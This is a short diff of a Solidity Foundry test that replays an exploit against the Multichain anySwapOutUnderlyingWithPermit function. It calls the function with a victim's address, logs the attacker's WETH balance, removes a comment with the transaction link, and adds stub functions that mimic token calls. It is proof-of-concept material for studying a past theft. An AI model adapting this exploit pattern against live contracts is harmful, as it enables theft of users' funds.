@@ -16,18 +16,6 @@ contract ContractTest is Test {
     }
 
     function testExample() public {
-        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
-        //    anySwapOutUnderlyingWithPermit(
-        //     address from,
-        //     address token,
-        //     address to,
-        //     uint amount,
-        //     uint deadline,
-        //     uint8 v,
-        //     bytes32 r,
-        //     bytes32 s,
-        //     uint toChainID
-        //   )
         any.anySwapOutUnderlyingWithPermit(
             0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,
             address(this),
@@ -45,6 +33,7 @@ contract ContractTest is Test {
         emit log_named_uint("After exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
     }
 
+    // The following functions are for matching Multichain contract calls and have no practical significance.
     function burn(address from, uint256 amount) external returns (bool) {
         amount;
         from;
